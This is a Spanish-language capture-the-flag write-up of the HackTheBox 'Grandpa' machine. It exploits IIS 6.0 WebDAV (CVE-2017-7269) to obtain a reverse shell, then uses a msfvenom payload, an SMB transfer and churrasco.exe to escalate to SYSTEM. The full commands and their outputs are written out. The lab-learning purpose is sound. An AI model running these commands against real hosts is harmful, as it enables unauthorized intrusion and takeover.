---
title: HackTheBox - Grandpa
categories: [Windows]
tags: [HackTheBox]
image: grandpa.png
img_path: /assets/HTB/Grandpa/
---

En este post voy a explicar como resolver la máquina Granny de [Hack The Box](https://app.hackthebox.com/machines/14), en la cual vamos a estar explotando una vulnerabilidad de un ```IIS 6.0``` y para la escalada vamos a hacer uso del exploit ```churrasco.exe```, si exactamene igual a la maquina [Granny](/posts/HackTheBox-Granny/)

## Escaneo de puertos

```
# nmap -p- -sS --min-rate 5000 -sCV -oN nmap -n -Pn 10.10.10.14
Nmap scan report for 10.10.10.14
Host is up (0.23s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
|_http-server-header: Microsoft-IIS/6.0
| http-webdav-scan:
|   Server Type: Microsoft-IIS/6.0
|   WebDAV type: Unknown
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|   Server Date: Mon, 12 Dec 2022 15:00:58 GMT
|_  Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK
|_http-title: Under Construction
| http-methods:
|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH
| http-ntlm-info:
|   Target_Name: GRANPA
|   NetBIOS_Domain_Name: GRANPA
|   NetBIOS_Computer_Name: GRANPA
|   DNS_Domain_Name: granpa
|   DNS_Computer_Name: granpa
|_  Product_Version: 5.2.3790
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Como vemos, la página tiene el puertos 80 (HTTP) abierto.

# Enumeración
Al ingresar a la página, vemos esto.

<img src="grandpa-pagina.png">

Si usamos la herramienta whatweb para recopilar información del servidor web, vemos que se está utilizando ```Microsoft-IIS[6.0]```.

```
$ whatweb http://10.10.10.14/

HTTPServer[Microsoft-IIS/6.0], IP[10.10.10.14], Microsoft-IIS[6.0][Under Construction], MicrosoftOfficeWebServer[5.0_Pub], UncommonHeaders[microsoftofficewebserver], X-Powered-By[ASP.NET]
```

Esta versión del ```IIS``` es vulnerable a ```ejecución de código arbitrario```, para explotarlo vamos a hacer uso de este [exploit](https://raw.githubusercontent.com/g0rx/iis6-exploit-2017-CVE-2017-7269/master/iis6%20reverse%20shell) creado por ```g0rx```, el cual nos mandara directamente una ```reverse shell```.

# Reverse Shell

```
$ curl -s  https://raw.githubusercontent.com/g0rx/iis6-exploit-2017-CVE-2017-7269/master/iis6%20reverse%20shell -o IIS-exploit.py

$ python2 IIS-exploit.py 10.10.10.14 80 [Reverse IP] [Reverse Port]

```
```
$ rlwrap nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.3] from (UNKNOWN) [10.10.10.14] 1030
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

c:\windows\system32\inetsrv>whoami
nt authority\network service
```

# Enumeración del sistema
Al hacer un ```whoami /priv```, veremos que tenemos el privilegio ```SeImpersonatePrivilege```, el cual podemos abusar haciendo uso del exploit ```churrasco.exe```, una alternativa al ```JuicyPotato.exe```, usaremos esa alternativa, ya que en algunos escenarios, el exploit JuicyPotato no es compatible con los sistemas más antiguos.

Lo primero que vamos a hacer es descargarnos el exploit ```churrasco.exe``` y crearnos un archivo malicioso haciendo uso de msfvenom el cual se encargue de mandarnos una reverse shell.

```
$ wget https://github.com/Re4son/Churrasco/raw/master/churrasco.exe
$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=4444 EXITFUNC=thread -f exe -a x86 --platform windows -o shell.exe

No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
Saved as: shell.exe
```

Una vez creados, los transferiremos a la máquina víctima, haciendo uso de la herramienta ```impacket-smbserver```.

```
$ sudo impacket-smbserver smbFolder $(pwd) -smb2support

Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

Una vez este inicializado el servidor SMB en la máquina local, descargaremos los archivo de la siguiente forma.

```
c:\windows\system32\inetsrv>cd C:\Windows\Temp

C:\WINDOWS\Temp>copy \\10.10.14.3\smbFolder\churrasco.exe churrasco.exe
        1 file(s) copied.

C:\WINDOWS\Temp>copy \\10.10.14.3\smbFolder\shell.exe shell.exe
        1 file(s) copied.

C:\WINDOWS\Temp>dir
 Volume in drive C has no label.
 Volume Serial Number is FDCB-B9EF

 Directory of C:\WINDOWS\Temp

12/12/2022  05:09 PM    <DIR>          .
12/12/2022  05:09 PM    <DIR>          ..
12/12/2022  05:06 PM            31,232 churrasco.exe
12/12/2022  05:06 PM            73,802 shell.exe
02/18/2007  02:00 PM            22,752 UPD55.tmp
12/24/2017  07:19 PM    <DIR>          vmware-SYSTEM
12/12/2022  04:14 AM            22,554 vmware-vmsvc.log
09/16/2021  12:15 PM             5,826 vmware-vmusr.log
12/12/2022  04:17 AM               637 vmware-vmvss.log
               6 File(s)        156,803 bytes
               3 Dir(s)   1,316,003,840 bytes free

C:\WINDOWS\Temp>
```

# Escalada de privilegios

Ahora nos pondremos en escucha por el puerto que le especificamos en el archivo malicioso, y lo ejecutaremos haciendo uso del exploit ```churrasco.exe``` para que nos llegue una reverse shell como ```nt authority\system```.

```
C:\WINDOWS\Temp>churrasco.exe
/churrasco/-->Usage: Churrasco.exe [-d] "command to run"
C:\WINDOWS\Temp>churrasco.exe -d ".\shell.exe"

/churrasco/-->Current User: NETWORK SERVICE
/churrasco/-->Getting Rpcss PID ...
/churrasco/-->Found Rpcss PID: 672
/churrasco/-->Searching for Rpcss threads ...
/churrasco/-->Found Thread: 676
/churrasco/-->Thread not impersonating, looking for another thread...
/churrasco/-->Found Thread: 680
/churrasco/-->Thread not impersonating, looking for another thread...
/churrasco/-->Found Thread: 688
/churrasco/-->Thread impersonating, got NETWORK SERVICE Token: 0x730
/churrasco/-->Getting SYSTEM token from Rpcss Service...
/churrasco/-->Found NETWORK SERVICE Token
/churrasco/-->Found LOCAL SERVICE Token
/churrasco/-->Found SYSTEM token 0x728
/churrasco/-->Running command with SYSTEM Token...
/churrasco/-->Done, command should have ran as SYSTEM!
```

```
$ rlwrap nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.3] from (UNKNOWN) [10.10.10.14] 1035
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

C:\WINDOWS\TEMP>whoami
nt authority\system
```
